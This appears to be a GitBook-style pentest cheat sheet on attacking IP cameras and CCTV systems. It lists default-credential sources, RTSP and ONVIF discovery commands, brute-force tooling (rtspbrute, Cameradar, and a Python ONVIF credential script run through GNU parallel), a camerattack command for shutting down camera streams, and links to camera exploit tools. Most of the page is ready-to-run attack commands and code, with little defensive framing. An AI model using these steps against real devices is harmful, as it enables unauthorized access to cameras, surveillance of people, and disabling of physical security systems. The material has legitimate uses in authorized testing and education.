# Hacking

&#x20;

<figure><img src="../../.gitbook/assets/image (162).png" alt="" width="563"><figcaption><p>"You see, but you do not observe." - S. Holmes</p></figcaption></figure>

## Default credentials

* [The default passwords of nearly every IP camera, Hackers Arise (2023)](https://www.hackers-arise.com/post/the-default-passwords-of-nearly-every-ip-camera)
* [Default Camera Passwords, IspyConnect](https://www.ispyconnect.com/userguide-default-passwords.aspx)

## RTSP

### Seeking out

> **Ports used by RTSP** :
>
> * 554
> * 5554
> * 8554

**Make a request**

```bash
curl -i -X OPTIONS rtsp://$ip/stream1 RTSP/1.1
# a valid RTSP service should respond RTSP/1.0 200 OK
```

### Scanning

```bash
nmap -sV --script "rtsp-*" -p $port $ip
```

### Bruteforce

[Common wordlist](https://github.com/nmap/nmap/blob/master/nselib/data/rtsp-urls.txt)

```bash
pip install rtspbrute av Pillow rich
rtspbrute -t hosts.txt -p 8554
```

### Cameradar | Get all the infos + bruteforce

```bash
git clone https://github.com/Ullaakut/cameradar
cd cameradar
# scan for default ports
docker run --net=host -t ullaakut/cameradar -t $ip

# bruteforce
docker run -t ullaakut/cameradar -t $ip -p $port -T 3s -s 3 -d
# with custom wordlist
docker run  ullaakut/cameradar -t -v /usr/share/seclists/Passwords/Common-Credentials:/tmp/dictionaries -c "tmp/dictionaries/10-million-password-list-top-1000000.json" -t $ip
```

## ONVIF

> If you receive long output in XML markup, then this device has support for the ONVIF protocol. ONVIF does not have a standard port, usually this protocol is found on ports 8899, 80, 8080, 5000, 6688.

### Install

```bash
sudo pip install onvif
git clone https://github.com/quatanium/python-onvif.git
cd python-onvif && python setup.py install
```

### Commands

**Get the hostname using this python script :**

```python
# python script
from onvif import ONVIFCamera
mycam = ONVIFCamera('192.168.0.2', 80, 'user', 'passwd', '/etc/onvif/wsdl/')

# Get Hostname
resp = mycam.devicemgmt.GetHostname()
print 'My camera`s hostname: ' + str(resp.Name)

# Get system date and time
dt = mycam.devicemgmt.GetSystemDateAndTime()
tz = dt.TimeZone
year = dt.UTCDateTime.Date.Year
hour = dt.UTCDateTime.Time.Hour
```

### Bruteforce

* Python Script :

```python
import sys
from onvif import ONVIFCamera
 
if len(sys.argv) < 4:
    user = ''
else:
    user = sys.argv[3]
 
if len(sys.argv) < 5:
    password = ''
else:
    password = sys.argv[4]      
 
mycam = ONVIFCamera(sys.argv[1], sys.argv[2], user, password, '/usr/local/lib/python3.9/site-packages/wsdl/')
 
resp = mycam.devicemgmt.GetDeviceInformation()
print (str(resp))
```

* Launch it :

```bash
parallel -j2 -a usernames.txt -a passwords.txt 'python3 bruteforcer.py $ip $port 2>/dev/null {1} {2}'
```

## Shut down CCTV

{% embed url="https://github.com/Ullaakut/camerattack" %}

```bash
# install
export GO111MODULE=on
go get github.com/ullaakut/camerattack@latest
cd $GOPATH/src/github.com/ullaakut/camerattack
go install

# usage
camerattack rtsp://0.0.0.0:8554/live.sdp
```

## Tricks that could work

> Try to login with empty passwords 7+ times

## Tools

{% embed url="https://github.com/EntySec/CamOver" %}
For CCTV, GoAhead, Netwave
{% endembed %}

## Resources

*   [Exploiting Surveillance Cameras like a Hollywood Hacker - Craig Heffner (2013)](https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-WP.pdf)

    > Linked exploit tool : [IPCamShell](https://github.com/nmalcolm/ipcamshell)
* [Hacking CCTV and IP cameras: Are you safe ? - David Bombai, Youtube (2022)](https://www.youtube.com/watch?v=ZGCScbV7vSA)
